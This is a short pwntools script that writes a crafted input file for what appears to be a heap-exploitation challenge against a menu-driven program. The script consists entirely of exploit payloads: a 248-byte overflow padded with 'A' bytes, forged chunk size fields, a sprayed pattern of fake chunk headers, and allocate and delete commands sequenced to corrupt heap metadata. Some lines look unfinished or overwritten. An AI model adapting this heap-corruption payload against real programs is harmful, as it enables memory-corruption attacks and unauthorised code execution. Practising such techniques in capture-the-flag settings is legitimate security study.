from pwn import *

if __name__ == '__main__':
    insert_pay_1 = str.encode("a\n255\n")
    insert_pay_2 = str.encode("a\n1\n")

    pay = b"\x41" * 248 + b'\n' + b'\xf0\x00\x00\x00' + b'\xfc\xff\xff\xff'  + b'\n'
    # pay_2 = b'\xcc\xcc\xcc\xcc' + b'\x48\x00\x00\x00' + b"\xcc" * 150 + b'\n'
    pay_2 = b"\xcc" * 255 + b'\n'
    
    pay_2 = b'\x08\x01\x00\x00\x48\x00\x00\x00' * 32

    insert_small_block = str.encode("a\n1\nA\n")
    del_block_0 = str.encode("d\n0\n")
    del_block_1 = str.encode("d\n1\n")
    del_block_2 = str.encode("d\n2\n")

    with open("input", "wb") as binary_file:
        binary_file.write(insert_pay_1)
        binary_file.write(pay)
        binary_file.write(insert_pay_2)
        binary_file.write(pay_2)
        binary_file.write(del_block_1)
